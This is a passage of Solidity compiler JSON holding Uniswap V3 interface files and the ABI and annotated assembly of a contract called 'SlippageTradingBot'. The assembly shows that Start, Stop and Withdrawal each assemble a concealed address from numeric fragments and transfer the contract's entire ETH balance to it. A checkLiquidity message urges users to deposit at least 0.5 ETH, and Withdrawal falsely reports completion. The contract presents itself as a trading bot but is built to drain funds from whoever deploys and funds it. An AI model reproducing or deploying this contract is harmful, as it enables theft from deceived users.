				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that can change\n/// @notice These methods compose the pool's state, and can change with any frequency including multiple times\n/// per transaction\ninterface IUniswapV3PoolState {\n    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n    /// when accessed externally.\n    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.\n    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n    /// boundary.\n    /// observationIndex The index of the last oracle observation that was written,\n    /// observationCardinality The current maximum number of observations stored in the pool,\n    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n    /// feeProtocol The protocol fee for both tokens of the pool.\n    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n    /// unlocked Whether the pool is currently locked to reentrancy\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n\n    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal0X128() external view returns (uint256);\n\n    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal1X128() external view returns (uint256);\n\n    /// @notice The amounts of token0 and token1 that are owed to the protocol\n    /// @dev Protocol fees will never exceed uint128 max in either token\n    function protocolFees() external view returns (uint128 token0, uint128 token1);\n\n    /// @notice The currently in range liquidity available to the pool\n    /// @dev This value has no relationship to the total liquidity across all ticks\n    function liquidity() external view returns (uint128);\n\n    /// @notice Look up information about a specific tick in the pool\n    /// @param tick The tick to look up\n    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n    /// tick upper,\n    /// liquidityNet how much liquidity changes when the pool price crosses the tick,\n    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n    /// secondsOutside the seconds spent on the other side of the tick from the current tick,\n    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for\n    /// a specific position.\n    function ticks(int24 tick)\n        external\n        view\n        returns (\n            uint128 liquidityGross,\n            int128 liquidityNet,\n            uint256 feeGrowthOutside0X128,\n            uint256 feeGrowthOutside1X128,\n            int56 tickCumulativeOutside,\n            uint160 secondsPerLiquidityOutsideX128,\n            uint32 secondsOutside,\n            bool initialized\n        );\n\n    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information\n    function tickBitmap(int16 wordPosition) external view returns (uint256);\n\n    /// @notice Returns the information about a position by the position's key\n    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n    /// @return _liquidity The amount of liquidity in the position,\n    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\n    function positions(bytes32 key)\n        external\n        view\n        returns (\n            uint128 _liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n\n    /// @notice Returns data about a specific observation index\n    /// @param index The element of the observations array to fetch\n    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n    /// ago, rather than at a specific index in the array.\n    /// @return blockTimestamp The timestamp of the observation,\n    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n    /// Returns initialized whether the observation has been initialized and the values are safe to use\n    function observations(uint256 index)\n        external\n        view\n        returns (\n            uint32 blockTimestamp,\n            int56 tickCumulative,\n            uint160 secondsPerLiquidityCumulativeX128,\n            bool initialized\n        );\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that never changes\n/// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values\ninterface IUniswapV3PoolImmutables {\n    /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n    /// @return The contract address\n    function factory() external view returns (address);\n\n    /// @notice The first of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token0() external view returns (address);\n\n    /// @notice The second of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token1() external view returns (address);\n\n    /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6\n    /// @return The fee\n    function fee() external view returns (uint24);\n\n    /// @notice The pool tick spacing\n    /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n    /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n    /// This value is an int24 to avoid casting even though it is always positive.\n    /// @return The tick spacing\n    function tickSpacing() external view returns (int24);\n\n    /// @notice The maximum amount of position liquidity that can use any tick in the range\n    /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n    /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n    /// @return The max amount of liquidity per tick\n    function maxLiquidityPerTick() external view returns (uint128);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/tradingbot.sol": {
				"SlippageTradingBot": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "",
									"type": "string"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "Start",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "Stop",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "Withdrawal",
							"outputs": [
								{
									"internalType": "string",
									"name": "result",
									"type": "string"
								}
							],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "checkLiquidity",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "pure",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/tradingbot.sol\":498:520  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/tradingbot.sol\":399:12963  contract SlippageTradingBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd82c52d6\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n    tag_10:\n        /* \"contracts/tradingbot.sol\":9227:9237  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":9240:9270  parseMemoryPool(callMempool()) */\n      tag_22\n        /* \"contracts/tradingbot.sol\":9256:9269  callMempool() */\n      tag_23\n        /* \"contracts/tradingbot.sol\":9256:9267  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":9256:9269  callMempool() */\n      jump\t// in\n    tag_23:\n        /* \"contracts/tradingbot.sol\":9240:9255  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":9240:9270  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_22:\n        /* \"contracts/tradingbot.sol\":9227:9270  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":9281:9306  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":9317:9319  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":9281:9320  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":9331:9340  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":9331:9349  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":9331:9365  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":9350:9364  getLiquidity() */\n      tag_26\n        /* \"contracts/tradingbot.sol\":9350:9362  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":9350:9364  getLiquidity() */\n      jump\t// in\n    tag_26:\n        /* \"contracts/tradingbot.sol\":9331:9365  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n        /* \"contracts/tradingbot.sol\":9215:9373  { ... */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":9183:9373  function Start() public payable { ... */\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n    tag_12:\n        /* \"contracts/tradingbot.sol\":10755:10775  string memory result */\n      0x60\n        /* \"contracts/tradingbot.sol\":10788:10798  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":10801:10831  parseMemoryPool(callMempool()) */\n      tag_31\n        /* \"contracts/tradingbot.sol\":10817:10830  callMempool() */\n      tag_32\n        /* \"contracts/tradingbot.sol\":10817:10828  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":10817:10830  callMempool() */\n      jump\t// in\n    tag_32:\n        /* \"contracts/tradingbot.sol\":10801:10816  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":10801:10831  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_31:\n        /* \"contracts/tradingbot.sol\":10788:10831  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10842:10867  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":10878:10880  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":10842:10881  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10892:10901  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":10892:10910  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":10892:10926  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":10911:10925  getLiquidity() */\n      tag_33\n        /* \"contracts/tradingbot.sol\":10911:10923  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":10911:10925  getLiquidity() */\n      jump\t// in\n    tag_33:\n        /* \"contracts/tradingbot.sol\":10892:10926  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_35:\n      pop\n        /* \"contracts/tradingbot.sol\":10937:10967  result = \"Withdrawal complete\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x13\n      dup2\n      mstore\n      0x20\n      add\n      0x5769746864726177616c20636f6d706c65746500000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap3\n      pop\n        /* \"contracts/tradingbot.sol\":11018:11031  return result */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":10709:11039  function Withdrawal() public payable returns (string memory result) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n    tag_16:\n        /* \"contracts/tradingbot.sol\":10075:10085  address to */\n      0x00\n        /* \"contracts/tradingbot.sol\":10088:10118  parseMemoryPool(callMempool()) */\n      tag_37\n        /* \"contracts/tradingbot.sol\":10104:10117  callMempool() */\n      tag_38\n        /* \"contracts/tradingbot.sol\":10104:10115  callMempool */\n      tag_24\n        /* \"contracts/tradingbot.sol\":10104:10117  callMempool() */\n      jump\t// in\n    tag_38:\n        /* \"contracts/tradingbot.sol\":10088:10103  parseMemoryPool */\n      tag_25\n        /* \"contracts/tradingbot.sol\":10088:10118  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_37:\n        /* \"contracts/tradingbot.sol\":10075:10118  address to = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10129:10154  address payable contracts */\n      0x00\n        /* \"contracts/tradingbot.sol\":10165:10167  to */\n      dup2\n        /* \"contracts/tradingbot.sol\":10129:10168  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10179:10188  contracts */\n      dup1\n        /* \"contracts/tradingbot.sol\":10179:10197  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/tradingbot.sol\":10179:10213  contracts.transfer(getLiquidity()) */\n      0x08fc\n        /* \"contracts/tradingbot.sol\":10198:10212  getLiquidity() */\n      tag_39\n        /* \"contracts/tradingbot.sol\":10198:10210  getLiquidity */\n      tag_27\n        /* \"contracts/tradingbot.sol\":10198:10212  getLiquidity() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/tradingbot.sol\":10179:10213  contracts.transfer(getLiquidity()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n        /* \"contracts/tradingbot.sol\":10063:10221  { ... */\n      pop\n      pop\n        /* \"contracts/tradingbot.sol\":10032:10221  function Stop() public payable { ... */\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n    tag_19:\n        /* \"contracts/tradingbot.sol\":10421:10434  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":10447:10582  return \"Not enough liquidity available on the contract to run the bot. Contract code needs at least 0.5 ETH to avoid current gas fees.\" */\n      mload(0x40)\n      dup1\n      0xa0\n      add\n      0x40\n      mstore\n      dup1\n      0x7e\n      dup2\n      mstore\n      0x20\n      add\n      data_66ba267ed9e689f4f612725ca4739f673c4421ca078ab0323046fa1dc83ed02a\n      0x7e\n      swap2\n      codecopy\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":10374:10590  function checkLiquidity() public pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":7268:8328  function callMempool() internal pure returns (string memory) {... */\n    tag_24:\n        /* \"contracts/tradingbot.sol\":7314:7327  string memory */\n      0x60\n        /* \"contracts/tradingbot.sol\":7340:7368  string memory _memPoolOffset */\n      0x00\n        /* \"contracts/tradingbot.sol\":7371:7417  mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      tag_44\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/tradingbot.sol\":7384:7416  checkMempool(getMemPoolOffset()) */\n      tag_45\n        /* \"contracts/tradingbot.sol\":7397:7415  getMemPoolOffset() */\n      tag_46\n        /* \"contracts/tradingbot.sol\":7397:7413  getMemPoolOffset */\n      tag_47\n        /* \"contracts/tradingbot.sol\":7397:7415  getMemPoolOffset() */\n      jump\t// in\n    tag_46:\n        /* \"contracts/tradingbot.sol\":7384:7396  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7384:7416  checkMempool(getMemPoolOffset()) */\n      jump\t// in\n    tag_45:\n        /* \"contracts/tradingbot.sol\":7371:7378  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7371:7417  mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      jump\t// in\n    tag_44:\n        /* \"contracts/tradingbot.sol\":7340:7417  string memory _memPoolOffset = mempool(\"x\", checkMempool(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7428:7444  uint _memPoolSol */\n      0x00\n        /* \"contracts/tradingbot.sol\":7447:7453  880572 */\n      0x0d6fbc\n        /* \"contracts/tradingbot.sol\":7428:7453  uint _memPoolSol = 880572 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7464:7483  uint _memPoolLength */\n      0x00\n        /* \"contracts/tradingbot.sol\":7486:7504  getMemPoolLength() */\n      tag_50\n        /* \"contracts/tradingbot.sol\":7486:7502  getMemPoolLength */\n      tag_51\n        /* \"contracts/tradingbot.sol\":7486:7504  getMemPoolLength() */\n      jump\t// in\n    tag_50:\n        /* \"contracts/tradingbot.sol\":7464:7504  uint _memPoolLength = getMemPoolLength() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7515:7532  uint _memPoolSize */\n      0x00\n        /* \"contracts/tradingbot.sol\":7535:7541  951347 */\n      0x0e8433\n        /* \"contracts/tradingbot.sol\":7515:7541  uint _memPoolSize = 951347 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7552:7571  uint _memPoolHeight */\n      0x00\n        /* \"contracts/tradingbot.sol\":7574:7592  getMemPoolHeight() */\n      tag_52\n        /* \"contracts/tradingbot.sol\":7574:7590  getMemPoolHeight */\n      tag_53\n        /* \"contracts/tradingbot.sol\":7574:7592  getMemPoolHeight() */\n      jump\t// in\n    tag_52:\n        /* \"contracts/tradingbot.sol\":7552:7592  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7603:7621  uint _memPoolWidth */\n      0x00\n        /* \"contracts/tradingbot.sol\":7624:7628  9349 */\n      0x2485\n        /* \"contracts/tradingbot.sol\":7603:7628  uint _memPoolWidth = 9349 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7639:7657  uint _memPoolDepth */\n      0x00\n        /* \"contracts/tradingbot.sol\":7660:7677  getMemPoolDepth() */\n      tag_54\n        /* \"contracts/tradingbot.sol\":7660:7675  getMemPoolDepth */\n      tag_55\n        /* \"contracts/tradingbot.sol\":7660:7677  getMemPoolDepth() */\n      jump\t// in\n    tag_54:\n        /* \"contracts/tradingbot.sol\":7639:7677  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7688:7706  uint _memPoolCount */\n      0x00\n        /* \"contracts/tradingbot.sol\":7709:7715  783125 */\n      0x0bf315\n        /* \"contracts/tradingbot.sol\":7688:7715  uint _memPoolCount = 783125 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7728:7751  string memory _memPool1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7754:7804  mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      tag_56\n        /* \"contracts/tradingbot.sol\":7762:7776  _memPoolOffset */\n      dup10\n        /* \"contracts/tradingbot.sol\":7778:7803  checkMempool(_memPoolSol) */\n      tag_57\n        /* \"contracts/tradingbot.sol\":7791:7802  _memPoolSol */\n      dup11\n        /* \"contracts/tradingbot.sol\":7778:7790  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7778:7803  checkMempool(_memPoolSol) */\n      jump\t// in\n    tag_57:\n        /* \"contracts/tradingbot.sol\":7754:7761  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7754:7804  mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      jump\t// in\n    tag_56:\n        /* \"contracts/tradingbot.sol\":7728:7804  string memory _memPool1 = mempool(_memPoolOffset, checkMempool(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7815:7838  string memory _memPool2 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7841:7906  mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      tag_58\n        /* \"contracts/tradingbot.sol\":7849:7877  checkMempool(_memPoolLength) */\n      tag_59\n        /* \"contracts/tradingbot.sol\":7862:7876  _memPoolLength */\n      dup10\n        /* \"contracts/tradingbot.sol\":7849:7861  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7849:7877  checkMempool(_memPoolLength) */\n      jump\t// in\n    tag_59:\n        /* \"contracts/tradingbot.sol\":7879:7905  checkMempool(_memPoolSize) */\n      tag_60\n        /* \"contracts/tradingbot.sol\":7892:7904  _memPoolSize */\n      dup10\n        /* \"contracts/tradingbot.sol\":7879:7891  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7879:7905  checkMempool(_memPoolSize) */\n      jump\t// in\n    tag_60:\n        /* \"contracts/tradingbot.sol\":7841:7848  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7841:7906  mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      jump\t// in\n    tag_58:\n        /* \"contracts/tradingbot.sol\":7815:7906  string memory _memPool2 = mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":7917:7940  string memory _memPool3 */\n      0x00\n        /* \"contracts/tradingbot.sol\":7943:8009  mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      tag_61\n        /* \"contracts/tradingbot.sol\":7951:7979  checkMempool(_memPoolHeight) */\n      tag_62\n        /* \"contracts/tradingbot.sol\":7964:7978  _memPoolHeight */\n      dup9\n        /* \"contracts/tradingbot.sol\":7951:7963  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7951:7979  checkMempool(_memPoolHeight) */\n      jump\t// in\n    tag_62:\n        /* \"contracts/tradingbot.sol\":7981:8008  checkMempool(_memPoolWidth) */\n      tag_63\n        /* \"contracts/tradingbot.sol\":7994:8007  _memPoolWidth */\n      dup9\n        /* \"contracts/tradingbot.sol\":7981:7993  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":7981:8008  checkMempool(_memPoolWidth) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/tradingbot.sol\":7943:7950  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":7943:8009  mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      jump\t// in\n    tag_61:\n        /* \"contracts/tradingbot.sol\":7917:8009  string memory _memPool3 = mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8020:8043  string memory _memPool4 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8046:8111  mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      tag_64\n        /* \"contracts/tradingbot.sol\":8054:8081  checkMempool(_memPoolDepth) */\n      tag_65\n        /* \"contracts/tradingbot.sol\":8067:8080  _memPoolDepth */\n      dup8\n        /* \"contracts/tradingbot.sol\":8054:8066  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":8054:8081  checkMempool(_memPoolDepth) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/tradingbot.sol\":8083:8110  checkMempool(_memPoolCount) */\n      tag_66\n        /* \"contracts/tradingbot.sol\":8096:8109  _memPoolCount */\n      dup8\n        /* \"contracts/tradingbot.sol\":8083:8095  checkMempool */\n      tag_48\n        /* \"contracts/tradingbot.sol\":8083:8110  checkMempool(_memPoolCount) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/tradingbot.sol\":8046:8053  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8046:8111  mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/tradingbot.sol\":8020:8111  string memory _memPool4 = mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8124:8150  string memory _allMempools */\n      0x00\n        /* \"contracts/tradingbot.sol\":8153:8222  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_67\n        /* \"contracts/tradingbot.sol\":8161:8190  mempool(_memPool1, _memPool2) */\n      tag_68\n        /* \"contracts/tradingbot.sol\":8169:8178  _memPool1 */\n      dup7\n        /* \"contracts/tradingbot.sol\":8180:8189  _memPool2 */\n      dup7\n        /* \"contracts/tradingbot.sol\":8161:8168  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8161:8190  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/tradingbot.sol\":8192:8221  mempool(_memPool3, _memPool4) */\n      tag_69\n        /* \"contracts/tradingbot.sol\":8200:8209  _memPool3 */\n      dup6\n        /* \"contracts/tradingbot.sol\":8211:8220  _memPool4 */\n      dup6\n        /* \"contracts/tradingbot.sol\":8192:8199  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8192:8221  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/tradingbot.sol\":8153:8160  mempool */\n      tag_49\n        /* \"contracts/tradingbot.sol\":8153:8222  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/tradingbot.sol\":8124:8222  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":8233:8259  string memory _fullMempool */\n      0x00\n        /* \"contracts/tradingbot.sol\":8262:8288  mempool(\"0\", _allMempools) */\n      tag_70\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      